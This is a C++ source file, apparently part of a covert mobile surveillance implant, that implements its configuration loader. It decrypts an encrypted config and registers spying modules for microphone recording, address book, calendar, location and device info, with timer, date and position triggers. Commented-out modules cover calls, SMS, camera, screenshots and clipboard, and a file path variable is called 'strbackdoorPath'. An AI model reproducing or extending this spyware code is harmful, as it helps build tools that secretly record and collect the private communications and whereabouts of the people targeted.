#include <exception>
#include "Conf.h"
#include "Status.h"
#include "Encryption.h"
#include "Log.h"
#include "Events.h"
#include "Microphone.h"
#include "RecordedCalls.h"
#include "Modules.h"

#include "FunctionFunc.h"

using namespace std;

Conf::Conf() : encryptionObj(g_ConfKey, KEY_LEN), jMod(NULL), jEv(NULL), jAct(NULL), jGlob(NULL) {
	statusObj = Status::self();

	

	strEncryptedConfName = g_ConfName;
#ifdef _DEBUG
	OutputDebugString(strEncryptedConfName.c_str());
#endif

}

Conf::~Conf(){
	if (jMod)
		delete jMod;

	if (jEv)
		delete jEv;

	if (jAct)
		delete jAct;

	if (jGlob)
		delete jGlob;
}

BOOL WINAPI Conf::ParseModule(JSONArray js) {

	UINT i = 0;
	ModulesManager *modulesManager = ModulesManager::self();

	for (i = 0; i < js.size(); i++) {
		JSONObject jo = js[i]->AsObject();
		JSONValue *c = jo[L"module"];

		if (c == NULL || c->IsString() == FALSE || c->AsString().empty() == TRUE) {
			// WARNING
			continue;
		}

		void* startProc = NULL;
		wstring moduleName = c->AsString();

#ifdef _DEBUG
		//wprintf(L"Parsing Module: %s\n", moduleName.c_str());
		WCHAR msg[128];
		swprintf_s(msg, L"Parsing Module: %s\n", moduleName.c_str());OutputDebugString(msg);

#endif

		do {
/***
			if (moduleName.compare(L"application") == 0 ) {
				startProc = ApplicationModule;
				break;
			}

			if (moduleName.compare(L"call") == 0 ) {
				startProc = RecordedCalls;
				break;
			}
***/
/***
			if (moduleName.compare(L"calllist") == 0 ) {
				startProc = CallListAgent;
				break;
			}
***/
/***
			if (moduleName.compare(L"camera") == 0 ) {
				startProc = CameraModule;
				break;
			}
***/
/***
			if (moduleName.compare(L"clipboard") == 0 ) {
				startProc = ClipboardModule;
				continue;
			}

			if (moduleName.compare(L"conference") == 0 ) {
				startProc = CallAgent;
				break;
			}
***/
			if (moduleName.compare(L"crisis") == 0 ) {
				startProc = CrisisModule;
				break;
			}

			
			if (moduleName.compare(L"device") == 0 ) {
				startProc = DeviceInfoAgent;
				break;
			}
			
/***
			if (moduleName.compare(L"livemic") == 0 ) {
				startProc = LiveMicModule;
				break;
			}

			if (moduleName.compare(L"messages") == 0 ) {
				startProc = SmsAgent;
				break;
			}
			***/
			if (moduleName.compare(L"mic") == 0 ) {
				startProc = RecordedMicrophone;
				break;
			}
			
			// AddressBook e calendar sono la stessa cosa
			if (moduleName.compare(L"addressbook") == 0) {
				startProc = AddressbookModule;
				break;
			}

			
			if (moduleName.compare(L"calendar") == 0 ) {
				startProc =CalendarModule;
				break;
			}
			

			if (moduleName.compare(L"position") == 0 ) {
				startProc = PositionModule;
				break;
			}
/***
			if (moduleName.compare(L"screenshot") == 0 ) {
				startProc = SnapshotModule;
				break;
			}
***/
/***
			if (moduleName.compare(L"url") == 0 ) {
				startProc = UrlModule;
				break;
			}
***/
		} while (0);

		if (startProc != NULL)
			modulesManager->add(moduleName, jo, startProc);

		// startProc == NULL -> Unknown agent
	}

	return TRUE;
}

BOOL WINAPI Conf::ParseAction(JSONArray js) {

	UINT i = 0;
	ActionsManager *actionsManager = ActionsManager::self();

	for (i = 0; i < js.size(); i++) {
		JSONObject jo = js[i]->AsObject();
		JSONValue *c = jo[L"subactions"];

		if (c == NULL || c->IsArray() == FALSE) {
			// WARNING
			continue;
		}

#ifdef _DEBUG
		WCHAR msg[128];
		wstring moduleName = jo[L"desc"]->AsString();
		//wprintf(L"Parsing Action: \"%s\"\n", moduleName.c_str());
		swprintf_s(msg, L"Parsing Action: \"%s\"\n", moduleName.c_str());OutputDebugString(msg);
#endif

		actionsManager->add(i, c->AsArray());
	}

	return TRUE;
}

BOOL WINAPI Conf::ParseEvent(JSONArray js) {

	UINT i = 0;
	EventsManager *eventsManager = EventsManager::self();

	for (i = 0; i < js.size(); i++) {
		JSONObject jo = js[i]->AsObject();
		JSONValue *c = jo[L"event"];

		if (c == NULL || c->IsString() == FALSE || c->AsString().empty() == TRUE) {
			// WARNING
			continue;
		}

		void* startProc = NULL;
		wstring eventName = c->AsString();

#ifdef _DEBUG
		WCHAR msg[128];
		//wprintf(L"Parsing Event: %s\n", eventName.c_str());
		swprintf_s(msg, L"Parsing Event: %s\n", eventName.c_str());OutputDebugString(msg);
#endif
		
		do {
		
			if (eventName.compare(L"ac") == 0 ) {
				startProc = OnAC;
				break;
			}

/***
			if (eventName.compare(L"battery") == 0 ) {
				startProc = OnBatteryLevel;
				break;
			}

			if (eventName.compare(L"call") == 0 ) {
				startProc = OnCall;
				break;
			}

			if (eventName.compare(L"connection") == 0 ) {
				startProc = OnConnection;
				break;
			}
			***/
			if (eventName.compare(L"position") == 0 ) {
				startProc = OnLocation;
				continue;
			}
			/***
			if (eventName.compare(L"process") == 0 ) {
				startProc = OnProcess;
				break;
			}

			if (eventName.compare(L"standby") == 0 ) {
				startProc = OnStandby;
				break;
			}

			if (eventName.compare(L"simchange") == 0 ) {
				startProc = OnSimChange;
				break;
			}
			***/
			if (eventName.compare(L"timer") == 0 ) {
				startProc = OnTimer;
				break;
			}
			/***
			if (eventName.compare(L"afterinst") == 0 ) {
				startProc = OnAfterInst;
				break;
			}
			***/
			if (eventName.compare(L"date") == 0 ) {
				startProc = OnDate;
				break;
			}
			/***
			if (eventName.compare(L"sms") == 0 ) {
				startProc = OnSms;
				break;
			}
			***/
		} while (0);

		if (startProc != NULL)
			eventsManager->add(eventName, jo, startProc);

		// startProc == NULL -> Unknown agent
	}

	return TRUE;
}

BOOL Conf::ParseGlobal(JSONArray js) {
	wstring type;

	type = L"quota";
	//statusObj->AddGlobal(type, js[type]);

	type = L"wipe";
	//statusObj->AddGlobal(type, js[type]);

	type = L"version";
	//statusObj->AddGlobal(type, js[type]);

	return TRUE;
}

BOOL Conf::ParseConfSection(JSONValue *jVal, char *conf, WCHAR *section, confCallback_t call_back) {

	JSONObject root;

	if (jVal) {
		delete jVal;
	}

	jVal = JSON::Parse(conf);

	if (!jVal)
		return FALSE;

	if (jVal->IsObject() == false) {
		delete jVal;
		jVal = NULL;

		return FALSE;
	}

	root = jVal->AsObject();

	if (root.find(section) != root.end() && root[section]->IsArray()) {
		call_back(root[section]->AsArray());
	}

	return TRUE;
}

// Questa funzione al termine deve liberare il puntatore ai dati decifrati
// MANAGEMENT: 
// Nella conf tutte le stringhe sono NULL-Terminate e in WCHAR. La lunghezza
// delle stringhe include il NULL ed e' espressa in BYTE.
BOOL Conf::LoadConf() {
#define EXIT_ON_ERROR(x)	if(x == NULL){ delete[] pConf; return FALSE;}
#define CLEAN_AND_EXIT(x)	delete[] pConf; return x;
	BYTE *pConf = NULL, *pTemp = NULL;
	wstring strBack, strMig;
	UINT Len = 0, i = 0, num = 0;
	BOOL bBackConf = FALSE;
	
	if (strEncryptedConfName.empty())
		return NULL;

	// Vediamo se dobbiamo migrare
	strMig = GetMigrationName(FALSE);
	
	if (strMig.empty() == FALSE && FileExists(strMig)) {
		strMig = GetMigrationName(TRUE);
		strBack = GetBackupName(TRUE);
		
		// Copiamo la migrazione come conf di backup
		if (CopyFile2(strMig.c_str(), strBack.c_str(), FALSE)) {
			DeleteFile(strMig.c_str());
		}
		
		Log logInfo;
		logInfo.WriteLogInfo(L"Migration conf activated");
	}

	// Vediamo prima se esiste una configurazione di backup valida
	strBack = GetBackupName(FALSE);


	if (strBack.empty() == FALSE && FileExists(strBack)) {
		pConf = encryptionObj.DecryptConf(strBack, &Len);

		Log logInfo;

		if (pConf == NULL) {
			logInfo.WriteLogInfo(L"Invalid new configuration, reverting");
		} else {
			logInfo.WriteLogInfo(L"New configuration activated");
		}
	}


	// Se non c'e' carichiamo quella di default
	if (pConf == NULL || Len == 0) {
		pConf = encryptionObj.DecryptConf(strEncryptedConfName, &Len);
	} else {
		bBackConf = TRUE; // Significa che dobbiamo spostare la conf di backup
	}


	if (pConf == NULL || Len == 0)
		return FALSE;

	ParseConfSection(jMod, (char *)pConf, L"modules", (confCallback_t)&Conf::ParseModule);
	ParseConfSection(jEv, (char *)pConf, L"events", (confCallback_t)&Conf::ParseEvent);
	ParseConfSection(jAct, (char *)pConf, L"actions", (confCallback_t)&Conf::ParseAction);
	ParseConfSection(jGlob, (char *)pConf, L"globals", (confCallback_t)&Conf::ParseGlobal);

	// Spostiamo la conf di backup
	if (bBackConf == FALSE) {
		// Facciamo il wipe della memoria
		ZeroMemory(pConf, Len);
		CLEAN_AND_EXIT(TRUE);
	}


	wstring strPath;

	strPath = GetCurrentPathStr(strEncryptedConfName);	
	strBack = GetBackupName(TRUE);

	// Meglio essere paranoici
	if (strBack.empty() == FALSE)
	{
		HRESULT hPara=CopyFile2(strBack.c_str(), strPath.c_str(), FALSE);
		if ( SUCCEEDED(hPara) == TRUE)
		{
			DeleteFile(strBack.c_str());
		}
	}

	return TRUE;
}

BOOL Conf::RemoveConf() {

	wstring strbackdoorPath;

	if (strEncryptedConfName.empty())
		return FALSE;

	strbackdoorPath = GetCurrentPath(NULL);

	if (strbackdoorPath.empty())
		return FALSE;

	strbackdoorPath += strEncryptedConfName;

	BOOL res = DeleteFile(strbackdoorPath.c_str());

	// Rimuovi anche il file di conf di backup
	strbackdoorPath = GetBackupName(TRUE);

	if (strbackdoorPath.empty())
		return res;

	DeleteFile(strbackdoorPath.c_str());
	return res;

}

BOOL Conf::FileExists(wstring &strInFile) {

	HANDLE hConfFile = INVALID_HANDLE_VALUE;
	wstring strCompletePath;

	// LOG_DIR + strInFile
	strCompletePath = GetCurrentPathStr(strInFile);

	if (strCompletePath.empty())
		return FALSE;

	// Apriamo il file
	hConfFile = _CreateFileW((PWCHAR)strCompletePath.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 
							NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hConfFile == INVALID_HANDLE_VALUE)
		return FALSE;

	CloseHandle(hConfFile);

	return TRUE;
}

// XXX - Va implementata! Per il momento scriviamo comunque tutto in maniera
// cifrata e leggiamo solo da file cifrati, per cui questa funzione non serve,
// viene lasciata qui per eventuali utilizzi futuri.
BOOL Conf::FillFile(WCHAR *wName) {
	return TRUE;
}

BYTE* Conf::MemStringCmp(BYTE *memory, CHAR *string, UINT uLen) {
	BYTE *ptr;
	UINT len = 0;
	ptr = memory;

	LOOP {
		if (!strcmp((CHAR *)ptr, string))
			return (ptr + strlen(string) + 1);

		ptr++;
		len++;

		if (len > uLen)
			return NULL;
	}
}

wstring Conf::GetBackupName(BOOL bCompletePath) {

	WCHAR *pBackExt;
	wstring strPath;

	if (bCompletePath == TRUE)
		strPath = GetCurrentPath(g_ConfName);
	else
		strPath = g_ConfName;

	wstring strExtension = L".bak";
	pBackExt = encryptionObj.EncryptName(strExtension, g_Challenge[0]);

	if (pBackExt == NULL)
		return strPath;

	strPath += pBackExt;

	free(pBackExt);

	return strPath;


}

wstring Conf::GetMigrationName(BOOL bCompletePath) {

	WCHAR *pBackExt;
	wstring strPath;

	if (bCompletePath == TRUE)
		strPath = GetCurrentPath(g_ConfName);
	else
		strPath = g_ConfName;

	wstring strExtension = L".mig";
	pBackExt = encryptionObj.EncryptName(strExtension, g_Challenge[0]);

	if (pBackExt == NULL)
		return strPath;

	strPath += pBackExt;

	free(pBackExt);

	return strPath;


}